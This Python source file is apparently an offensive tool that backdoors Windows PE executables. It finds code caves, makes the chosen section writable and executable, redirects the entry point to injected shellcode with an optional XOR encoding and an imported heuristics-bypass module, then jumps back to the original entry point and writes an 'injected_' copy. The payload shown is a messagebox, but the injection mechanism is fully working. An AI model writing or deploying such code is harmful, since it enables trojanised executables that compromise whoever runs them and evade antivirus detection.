import pefile
import mmap
import os
from coloroma_colors import *
from heuristics_bypass import *
from itertools import cycle
from xor_encoder import *
from shellcode import * 


class InjectExistingSection(object):
	# Global Variables
	OPTIONS = 0

	def __init__(self, pefile_path, cave_size, encode):
		self.pefile_path = pefile_path
		self.cave_size = cave_size
		self.encode = encode

	def _generate_patched_pefile_path(self):
		"""
		Gets the name of the PE file.
		"""
		file_name = self.pefile_path.split('/')[-1]
		patched_file_name = 'injected_{}'.format(file_name)
		patched_file_path = '{}/{}'.format('/'.join(self.pefile_path.split('/')[:-1]), patched_file_name)
		return patched_file_path

	def load_pefile(self):
		"""
		Loads the PE file.
		"""
		pe = pefile.PE(self.pefile_path)
		return pe

	def find_cave(self, pe):
		"""
		Find code caves within the PE file.
		"""
		print('[*] Searching for code caves...')
		caves_found = {}
		image_base = pe.OPTIONAL_HEADER.ImageBase
		pe_file_data = open(self.pefile_path, 'rb')
		for section in pe.sections:
			caves_found = self._calculate_cave_size(section, pe_file_data, image_base, caves_found)
		if len(caves_found) == 0:
			print(print_red('[!] No caves found!'))
			return (None, None, None)
		else:
			return self._prompt_cave_choice(caves_found)

	def _calculate_cave_size(self, section, pe_file_data, image_base, caves_found):
		"""
		Calculate the size of the code cave found.
		"""
		if section.SizeOfRawData != 0:
			byte_position = 0
			empty_byte_position = 0
			pe_file_data.seek(section.PointerToRawData, 0)
			section_data = pe_file_data.read(section.SizeOfRawData)
			for byte in section_data:
				byte_position += 1
				if byte == 0x00:
					empty_byte_position += 1
				else:
					if empty_byte_position > self.cave_size:
						raw_address = section.PointerToRawData + byte_position - empty_byte_position - 1
						virtual_address = image_base + section.VirtualAddress + byte_position - empty_byte_position - 1
						self.OPTIONS += 1
						print(print_green("\t[!] Option {} : Code Cave Found!:".format(self.OPTIONS)))
						print("\tSection: \t\t%s" % section.Name.decode())
						print("\tSize: \t\t\t%d bytes" % empty_byte_position)
						print("\tRaw: \t\t\t0x%08X" % raw_address)
						print("\tVirtual: \t\t0x%08X\n" % virtual_address)
						caves_found[self.OPTIONS] = (section, virtual_address, raw_address)
					empty_byte_position = 0
		return caves_found

	def _prompt_cave_choice(self, caves_found):
		"""
		Prompt the user to enter his/her preferred code cave for injection.
		"""
		while True:
			user_choice = int(input('[*] Select your cave option : '))
			if user_choice in caves_found.keys():
				return caves_found[user_choice]
			else:
				print(print_red('[!] Error, invalid choice'))

	def inject_shellcode(self, pe, section, virtual_address, raw_address):
		"""
		Inject the shellcode into a new copy of the pe file.
		"""
		print('\n[*] Injecting shellcode...')
		section.Characteristics = 0xE0000040
		image_base = pe.OPTIONAL_HEADER.ImageBase
		oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint + image_base
		new_ep = virtual_address - image_base
		shellcode = messagebox_shellcode()
		if not self.encode:
			pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
			shellcode = self._alter_shellcode(oep, shellcode)
		else:
			shellcode = xor_encode_shellcode(new_ep, shellcode) 
		pe.set_bytes_at_offset(raw_address, shellcode)
		pe.write(self._generate_patched_pefile_path())
		print(print_green('\t[!] Shellcode injected!'))

	def _alter_shellcode(self, original_ep, shellcode):
		"""
		Alter the shellcode to jmp back to the original EP.
		"""
		original_ep_in_bytes = original_ep.to_bytes(4, 'little')
		shellcode = shellcode + b"\xB8" + original_ep_in_bytes + b"\xFF\xD0"
		return shellcode
# # https://www.exploit-db.com/docs/english/42061-introduction-to-manual-backdooring.pdf